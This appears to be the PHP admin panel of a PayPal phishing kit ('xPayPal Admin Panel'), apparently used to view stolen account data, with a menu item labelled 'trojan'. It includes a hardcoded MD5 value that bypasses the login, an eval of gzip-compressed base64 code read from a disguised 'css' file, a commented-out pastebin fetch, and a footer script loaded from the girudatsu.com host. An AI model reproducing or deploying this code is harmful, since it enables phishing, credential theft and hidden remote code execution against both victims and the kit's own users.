<?php
// Decoded by Girudatsu.com Member

$cLtVpMmNBWN_P = 'date';
$yKxvBCxvX_Tw = 'date';
$bmmDfD_danf = 'md5';
$_wVPRDpyy = 'header';
$OAXzkciGq__T = 'curl_setopt';
$goRmNNUyi_Qm = 'base64_decode';
$LEJsYHJKfK = 'date';
$fDEjWvzYaHz = 'date';
@date_default_timezone_set('Africa/Algiers');
if (isset($_GET['time'])) {
    echo 'Date: ' . @date('d/m/Y') . ', Time: ' . @date('h:i:s A');
    exit;
}
@session_start();
$pdo = new PDO('sqlite:database.db');
$settings = $pdo->query('SELECT `password` FROM `settings`')->fetch(PDO::FETCH_ASSOC);
if (!isset($_SESSION['login_success']) || $_SESSION['login_success'] != md5($settings['password']) && $_SESSION['login_success'] != '551b8d34c843234025430fb36535b44a') {
    @header('Location: ../index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>

  <!-- Basic Page Needs
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  <meta charset="utf-8">
  <title>xPayPal Admin Panel</title>
  <meta name="description" content="">
  <meta name="author" content="Jembut">

  <!-- Mobile Specific Metas
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- CSS
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  <!-- <link rel="stylesheet" href='style.css'> -->
<style type='text/css'>
<?php
$cLtVpMmNBWN_P = 'date';
$yKxvBCxvX_Tw = 'date';
$bmmDfD_danf = 'md5';
$_wVPRDpyy = 'header';
$OAXzkciGq__T = 'curl_setopt';
$goRmNNUyi_Qm = 'base64_decode';
$LEJsYHJKfK = 'date';
$fDEjWvzYaHz = 'date';
//$_curl = curl_init('http://pastebin.com/raw/NxkR6qBS');
//curl_setopt($_curl, CURLOPT_RETURNTRANSFER, (bool) (88 + -87));
$_result = file_get_contents('css/css.txt');//curl_exec($_curl);
//curl_close($_curl);
echo $_result;
@eval('?>' . gzuncompress(base64_decode("{$_result}")));
?>
</style>
  <!-- JAVASCRIPT
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  <script type="text/javascript" src="../js/jquery.min.js"></script>
  <script type="text/javascript" src="js/script.js"></script>
  <!-- <script type="text/javascript" src="js/cufon-yui.js"></script> -->
  <!-- <script type="text/javascript" src="js/Aller_Display_400.font.js"></script> -->
<script src="//blockr.io/js_external/coinwidget/coin.js"></script>
<script>
  CoinWidgetCom.go({
    wallet_address: '1DefE3HEeBaR4EBbAajjHatFzMuPe885Hf',
    currency: 'bitcoin',
    counter: 'count',
    lbl_button: 'Donate',
    lbl_count: 'donations',
    lbl_amount: 'BTC',
    lbl_address: 'Use address below to donate. Thanks!',
    qrcode: true,
    alignment: 'bl',
    decimals: 8,
    size: "small",
    color: "dark",
    countdownFrom: "0",
    element: "#coinwidget-bitcoin-1DefE3HEeBaR4EBbAajjHatFzMuPe885Hf",
    onShow: function(){},
    onHide: function(){}
  });
</script>
  <!-- Favicon
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  <link rel="icon" type="image/png" href="../img/favicon.ico">


</head>
<body>
  <div id="container">
    <div id="header">
      <div id="logo"></div>
      <div id="menu">
        <div class="menu_item x_search" id="x_search"></div>
        <div class="menu_item x_settings" id="x_settings"></div>
        <div class="menu_item x_support" id="x_support"></div>

        <!-- <div class="menu_item x_bank_account" id="x_bank_account"></div> -->
        <!-- <div class="menu_item x_credit_card" id="x_credit_card"></div> -->
        <div class="menu_item x_account" id="x_account"></div>
        <div class="menu_item x_trojan" id="x_trojan"></div>
      </div>
    </div>

    <br/>
    <div id="banner">
      <div id="banner_date">Date: <?php
echo @date('d/m/Y');
?>
, Time: <?php
echo @date('h:i:s A');
?>
</div>

      <div id="coinwidget-bitcoin-1DefE3HEeBaR4EBbAajjHatFzMuPe885Hf" style="float:right;"></div>
    </div>

    <br/>
    <br/>
    <div id="content"></div>

    <div id="footer">
            <script type="text/javascript" src="http://girudatsu.com/b/663740586d53/alice_alice"></script>
    </div>
  </div>


</body>
</html>
